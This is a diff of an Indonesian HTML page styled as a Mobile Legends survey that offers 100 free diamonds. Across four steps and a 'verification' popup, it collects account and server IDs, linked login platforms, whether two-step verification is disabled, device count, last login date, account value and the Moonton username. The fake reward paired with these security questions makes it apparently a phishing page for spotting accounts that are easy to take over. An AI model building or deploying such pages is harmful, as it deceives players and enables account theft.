@@ -3,196 +3,342 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-  <title>Survei MLBB - Reward Spesial</title>
+  <title>Survei Mobile Legends - Dapatkan Reward</title>
   <link rel="stylesheet" href="style.css">
-  <!-- Supabase CDN -->
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 </head>
 <body>
-  <div id="app">
+  <div class="container">
     <!-- SLIDE 1 -->
     <div class="slide active" id="slide1">
-      <h1 class="judul">Pilih sesuai anda yang inginkan</h1>
-      <div class="form-group">
-        <label class="subjudul">Yang di butuhkan</label>
-        <select id="layanan">
-          <option value="" disabled selected>-- Pilih --</option>
-          <option value="Layanan Service Akun">Layanan Service Akun</option>
-          <option value="Survei">Survei</option>
-        </select>
+      <div class="banner">
+        <svg class="banner-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
+        </svg>
+        <h2 class="banner-title">Pilih Layanan yang Anda Inginkan</h2>
+        <p class="banner-subtitle">Langkah 1 dari 4 - Pilih jenis layanan yang sesuai kebutuhan Anda</p>
       </div>
-      <button class="nav-btn next-btn" onclick="nextSlide(1)">Lanjut</button>
+      
+      <div class="form-container">
+        <div class="form-group">
+          <label class="form-label">
+            <svg class="label-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/>
+            </svg>
+            Yang Dibutuhkan
+          </label>
+          <select id="layanan" class="form-select">
+            <option value="" disabled selected>-- Pilih Layanan --</option>
+            <option value="Layanan Service Akun">Layanan Service Akun</option>
+            <option value="Survei">Survei</option>
+          </select>
+        </div>
+      </div>
+      
+      <button class="btn-next" onclick="nextSlide(1)">
+        Lanjut
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <path d="M5 12h14M12 5l7 7-7 7"/>
+        </svg>
+      </button>
     </div>
 
     <!-- SLIDE 2 -->
     <div class="slide" id="slide2">
-      <h1 class="judul">Pengenalan permainan</h1>
-      <div class="form-group">
-        <label class="subjudul">Dimana platform, mengenal ml</label>
-        <select id="platform_kenal">
-          <option value="" disabled selected>-- Pilih --</option>
-          <option>Tiktok</option> <option>Instagram</option> <option>Whatsapp</option>
-          <option>Youtube</option> <option>Threads</option> <option>Facebook</option>
-          <option>Lainnya</option>
-        </select>
+      <div class="banner">
+        <svg class="banner-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><path d="M8 21h8M12 17v4"/>
+        </svg>
+        <h2 class="banner-title">Pengenalan Permainan</h2>
+        <p class="banner-subtitle">Langkah 2 dari 4 - Ceritakan bagaimana Anda mengenal Mobile Legends</p>
       </div>
-      <div class="form-group">
-        <label class="subjudul">Bergabung ke mobile legend sejak</label>
-        <select id="tahun_gabung"></select>
+
+      <div class="form-container">
+        <div class="form-group">
+          <label class="form-label">Dimana platform mengenal ML?</label>
+          <select id="platform_kenal" class="form-select">
+            <option value="" disabled selected>-- Pilih Platform --</option>
+            <option>Tiktok</option>
+            <option>Instagram</option>
+            <option>Whatsapp</option>
+            <option>Youtube</option>
+            <option>Threads</option>
+            <option>Facebook</option>
+            <option>Lainnya</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label">Bergabung ke Mobile Legend sejak</label>
+          <select id="tahun_gabung" class="form-select"></select>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label">Negara asal anda</label>
+          <input type="text" id="negara" class="form-input" placeholder="Contoh: Indonesia">
+        </div>
       </div>
-      <div class="form-group">
-        <label class="subjudul">Negara asal anda</label>
-        <input type="text" id="negara" placeholder="Indonesia">
-      </div>
-      <div class="nav-buttons">
-        <button class="nav-btn prev-btn" onclick="prevSlide(2)">Kembali</button>
-        <button class="nav-btn next-btn" onclick="nextSlide(2)">Lanjut</button>
+
+      <div class="btn-group">
+        <button class="btn-prev" onclick="prevSlide(2)">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M19 12H5M12 19l-7-7 7-7"/>
+          </svg>
+          Kembali
+        </button>
+        <button class="btn-next" onclick="nextSlide(2)">
+          Lanjut
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M5 12h14M12 5l7 7-7 7"/>
+          </svg>
+        </button>
       </div>
     </div>
 
     <!-- SLIDE 3 -->
     <div class="slide" id="slide3">
-      <h1 class="judul">Platform yang tersedia</h1>
-      <div class="form-group">
-        <label class="subjudul">Bind yang tersedia</label>
-        <input type="text" id="bind_tersedia" placeholder="Seperti Facebook, dan lain">
+      <div class="banner">
+        <svg class="banner-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><path d="M12 20v-7"/>
+        </svg>
+        <h2 class="banner-title">Platform yang Tersedia</h2>
+        <p class="banner-subtitle">Langkah 3 dari 4 - Informasi bind dan keamanan akun Anda</p>
       </div>
-      <div class="form-group">
-        <label class="subjudul">Bind yang non-aktif</label>
-        <input type="text" id="bind_nonaktif" placeholder="Ketik tidak, jika tidak ada">
+
+      <div class="form-container">
+        <div class="form-group">
+          <label class="form-label">Bind yang tersedia</label>
+          <input type="text" id="bind_tersedia" class="form-input" placeholder="Seperti Facebook, dan lain">
+        </div>
+
+        <div class="form-group">
+          <label class="form-label">Bind yang non-aktif</label>
+          <input type="text" id="bind_nonaktif" class="form-input" placeholder="Ketik tidak, jika tidak ada">
+        </div>
+
+        <div class="form-group">
+          <label class="form-label">Verifikasi 2 Langkah (V2L)</label>
+          <select id="v2l" class="form-select">
+            <option value="" disabled selected>-- Pilih Status --</option>
+            <option value="mati">Mati</option>
+            <option value="hidup">Hidup</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label">Jumlah device dalam akun</label>
+          <select id="jumlah_device" class="form-select">
+            <option value="" disabled selected>-- Pilih Jumlah --</option>
+            <option>1 aja</option>
+            <option>Lebih dari 3</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label">Terakhir anda login</label>
+          <input type="date" id="terakhir_login" class="form-input">
+        </div>
       </div>
-      <div class="form-group">
-        <label class="subjudul">Verifikasi 2 Langkah (V2L)</label>
-        <select id="v2l">
-          <option value="" disabled selected>-- Pilih --</option>
-          <option>mati</option> <option>hidup</option>
-        </select>
-      </div>
-      <div class="form-group">
-        <label class="subjudul">Jumlah device dalam akun</label>
-        <select id="jumlah_device">
-          <option value="" disabled selected>-- Pilih --</option>
-          <option>1 aja</option> <option>Lebih dari 3</option>
-        </select>
-      </div>
-      <div class="form-group">
-        <label class="subjudul">Terakhir anda login</label>
-        <input type="date" id="terakhir_login">
-      </div>
-      <div class="nav-buttons">
-        <button class="nav-btn prev-btn" onclick="prevSlide(3)">Kembali</button>
-        <button class="nav-btn next-btn" onclick="nextSlide(3)">Lanjut</button>
+
+      <div class="btn-group">
+        <button class="btn-prev" onclick="prevSlide(3)">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M19 12H5M12 19l-7-7 7-7"/>
+          </svg>
+          Kembali
+        </button>
+        <button class="btn-next" onclick="nextSlide(3)">
+          Lanjut
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M5 12h14M12 5l7 7-7 7"/>
+          </svg>
+        </button>
       </div>
     </div>
 
     <!-- SLIDE 4 -->
     <div class="slide" id="slide4">
-      <h1 class="judul">Keterangan akun</h1>
-      <div class="form-group">
-        <label class="subjudul">Masukan id akun</label>
-        <input type="number" id="id_akun" placeholder="ID">
+      <div class="banner">
+        <svg class="banner-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/>
+        </svg>
+        <h2 class="banner-title">Keterangan Akun</h2>
+        <p class="banner-subtitle">Langkah 4 dari 4 - Detail informasi akun Mobile Legends Anda</p>
       </div>
-      <div class="form-group">
-        <label class="subjudul">Masukan id server</label>
-        <input type="number" id="id_server" placeholder="Tidak memakai ( )">
-      </div>
-      <div class="form-group">
-        <label class="subjudul">Level Akun</label>
-        <input type="text" id="level_akun">
-      </div>
-      <div class="form-group">
-        <label class="subjudul">Nama akun</label>
-        <input type="text" id="nama_akun" placeholder="Jika nama susah, ketik saja. null">
-      </div>
-      <div class="form-group">
-        <label class="subjudul">Level kolektor</label>
-        <select id="level_kolektor">
-          <option value="" disabled selected>-- Pilih --</option>
-          <option>Kolektor pemula</option> <option>Kolektor junior</option>
-          <option>Kolektor Senior</option> <option>Kolektor ahli</option>
-          <option>Kolektor ternama</option> <option>Kolektor terhormat</option>
-          <option>Kolektor juragan</option> <option>Kolektor Sultan</option>
-        </select>
-      </div>
-      <div class="form-group">
-        <label class="subjudul">Total skin</label>
-        <select id="total_skin">
-          <option value="" disabled selected>-- Pilih --</option>
-          <option>Kurang dari 50</option> <option>Kurang dari 100</option>
-          <option>Lebih dari 100</option> <option>Lebih dari 300</option>
-          <option>Lebih dari 500</option>
-        </select>
-      </div>
-      <div class="form-group">
-        <label class="subjudul">Total hero</label>
-        <select id="total_hero">
-          <option value="" disabled selected>-- Pilih --</option>
-          <option>Kurang dari 50</option> <option>Kurang dari 100</option>
-          <option>Lebih dari 100</option> <option>Lebih dari 300</option>
-        </select>
-      </div>
-      <div class="form-group">
-        <label class="subjudul">Hero terakhir dimainkan</label>
-        <input type="text" id="hero_terakhir" placeholder="Isi 3, contoh =julian, nana, Bane">
-      </div>
-      <div class="form-group">
-        <label class="subjudul">Rank tertinggi</label>
-        <select id="rank_tertinggi">
-          <option value="" disabled selected>-- Pilih --</option>
-          <option>Warrior</option> <option>elite</option> <option>master</option>
-          <option>grandmaster</option> <option>epik</option> <option>legend</option>
-          <option>mythic b1-24</option> <option>mythic honor</option>
-          <option>mythic glory</option> <option>mythic immortal</option>
-        </select>
-      </div>
-      <div class="form-group">
-        <label class="subjudul">Lanjutan</label>
-        <input type="text" id="username_moonton" placeholder="Isi username akun moonton">
-      </div>
-      <div class="nav-buttons">
-        <button class="nav-btn prev-btn" onclick="prevSlide(4)">Kembali</button>
-        <button class="nav-btn submit-btn" id="submitSurveyBtn">Lanjut</button>
-      </div>
-    </div>
 
-    <!-- HALAMAN REWARD (hidden default) -->
-    <div class="slide" id="rewardPage">
-      <h1 class="judul" style="margin-bottom:1.5rem;">🎁 Reward Survei Anda</h1>
-      <div class="reward-card">
-        <img src="https://files.catbox.moe/3nz96p.jpg" alt="Hadiah Diamond ML" style="width:200px; border-radius:16px; margin-bottom:1rem;">
-        <h2>100 Diamond MLBB</h2>
-        <button class="nav-btn claim-btn" id="claimRewardBtn">Terima Reward</button>
-      </div>
-    </div>
+      <div class="form-container">
+        <div class="form-row">
+          <div class="form-group">
+            <label class="form-label">Masukan ID Akun</label>
+            <input type="number" id="id_akun" class="form-input" placeholder="123456789">
+          </div>
+          <div class="form-group">
+            <label class="form-label">Masukan ID Server</label>
+            <input type="number" id="id_server" class="form-input" placeholder="Tidak memakai ( )">
+          </div>
+        </div>
 
-    <!-- POP UP: Verifikasi Akun sebelum klaim -->
-    <div class="popup-overlay" id="verifyPopup">
-      <div class="popup-box">
-        <h3>Verifikasi Akun</h3>
-        <input type="number" id="pop_id_akun" placeholder="ID Akun" required>
-        <input type="number" id="pop_id_server" placeholder="ID Server" required>
-        <select id="pop_platform">
-          <option value="" disabled selected>Pilih Platform</option>
-          <option>Moonton</option> <option>Facebook</option> <option>Google</option>
-        </select>
-        <div style="display:flex; gap:0.5rem; margin-top:1rem;">
-          <button class="nav-btn prev-btn" id="cancelVerifyBtn">Batal</button>
-          <button class="nav-btn submit-btn" id="confirmVerifyBtn">Klaim</button>
+        <div class="form-group">
+          <label class="form-label">Level Akun</label>
+          <input type="text" id="level_akun" class="form-input" placeholder="Contoh: 120">
+        </div>
+
+        <div class="form-group">
+          <label class="form-label">Nama Akun</label>
+          <input type="text" id="nama_akun" class="form-input" placeholder="Jika nama susah, ketik saja: null">
+        </div>
+
+        <div class="form-group">
+          <label class="form-label">Level Kolektor</label>
+          <select id="level_kolektor" class="form-select">
+            <option value="" disabled selected>-- Pilih Level --</option>
+            <option>Kolektor Pemula</option>
+            <option>Kolektor Junior</option>
+            <option>Kolektor Senior</option>
+            <option>Kolektor Ahli</option>
+            <option>Kolektor Ternama</option>
+            <option>Kolektor Terhormat</option>
+            <option>Kolektor Juragan</option>
+            <option>Kolektor Sultan</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label">Total Skin</label>
+          <select id="total_skin" class="form-select">
+            <option value="" disabled selected>-- Pilih Range --</option>
+            <option>Kurang dari 50</option>
+            <option>Kurang dari 100</option>
+            <option>Lebih dari 100</option>
+            <option>Lebih dari 300</option>
+            <option>Lebih dari 500</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label">Total Hero</label>
+          <select id="total_hero" class="form-select">
+            <option value="" disabled selected>-- Pilih Range --</option>
+            <option>Kurang dari 50</option>
+            <option>Kurang dari 100</option>
+            <option>Lebih dari 100</option>
+            <option>Lebih dari 300</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label">Hero Terakhir Dimainkan</label>
+          <input type="text" id="hero_terakhir" class="form-input" placeholder="Isi 3, contoh: Julian, Nana, Bane">
+        </div>
+
+        <div class="form-group">
+          <label class="form-label">Rank Tertinggi</label>
+          <select id="rank_tertinggi" class="form-select">
+            <option value="" disabled selected>-- Pilih Rank --</option>
+            <option>Warrior</option>
+            <option>Elite</option>
+            <option>Master</option>
+            <option>Grandmaster</option>
+            <option>Epic</option>
+            <option>Legend</option>
+            <option>Mythic B1-24</option>
+            <option>Mythic Honor</option>
+            <option>Mythic Glory</option>
+            <option>Mythic Immortal</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label">Lanjutan (Username Moonton)</label>
+          <input type="text" id="username_moonton" class="form-input" placeholder="Isi username akun moonton">
         </div>
       </div>
+
+      <div class="btn-group">
+        <button class="btn-prev" onclick="prevSlide(4)">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M19 12H5M12 19l-7-7 7-7"/>
+          </svg>
+          Kembali
+        </button>
+        <button class="btn-submit" id="submitSurveyBtn">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/>
+          </svg>
+          Kirim Survei
+        </button>
+      </div>
     </div>
 
-    <!-- POP UP BERHASIL -->
-    <div class="popup-overlay" id="successPopup">
-      <div class="popup-box success-box">
-        <div class="checkmark-circle">✔</div>
-        <h3>Berhasil!</h3>
-        <p>Reward telah diklaim dan tercatat.</p>
-        <button class="nav-btn submit-btn" id="closeSuccessBtn">Tutup</button>
+    <!-- REWARD PAGE -->
+    <div class="slide" id="rewardPage">
+      <div class="banner success-banner">
+        <svg class="banner-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/>
+        </svg>
+        <h2 class="banner-title">Selamat! Survei Berhasil</h2>
+        <p class="banner-subtitle">Klaim reward spesial untuk Anda sekarang</p>
       </div>
+
+      <div class="reward-card">
+        <div class="reward-image">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+            <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/>
+          </svg>
+        </div>
+        <h3 class="reward-title">100 Diamond Mobile Legends</h3>
+        <p class="reward-desc">Gratis untuk Anda yang telah menyelesaikan survei</p>
+        <button class="btn-claim" id="claimRewardBtn">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <polyline points="20 12 20 22 4 22 4 12"/><rect x="2" y="7" width="20" height="5"/><path d="M12 22V7"/>
+          </svg>
+          Terima Reward
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- POPUP VERIFIKASI -->
+  <div class="popup-overlay" id="verifyPopup">
+    <div class="popup-card">
+      <div class="popup-header">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+        </svg>
+        <h3>Verifikasi Akun</h3>
+        <p>Masukkan data akun untuk klaim reward</p>
+      </div>
+      <div class="popup-body">
+        <input type="number" id="pop_id_akun" class="form-input" placeholder="ID Akun" required>
+        <input type="number" id="pop_id_server" class="form-input" placeholder="ID Server" required>
+        <select id="pop_platform" class="form-select">
+          <option value="" disabled selected>Pilih Platform</option>
+          <option>Moonton</option>
+          <option>Facebook</option>
+          <option>Google</option>
+        </select>
+      </div>
+      <div class="popup-footer">
+        <button class="btn-prev" id="cancelVerifyBtn">Batal</button>
+        <button class="btn-submit" id="confirmVerifyBtn">Klaim Sekarang</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- POPUP SUKSES -->
+  <div class="popup-overlay" id="successPopup">
+    <div class="popup-card success-card">
+      <div class="success-icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
+          <polyline points="20 6 9 17 4 12"/>
+        </svg>
+      </div>
+      <h3>Berhasil!</h3>
+      <p>Reward telah diklaim dan tercatat dalam sistem</p>
+      <button class="btn-submit" id="closeSuccessBtn">Tutup</button>
     </div>
   </div>
 
   <script src="script.js"></script>
 </body>
-</html>
+            </html>
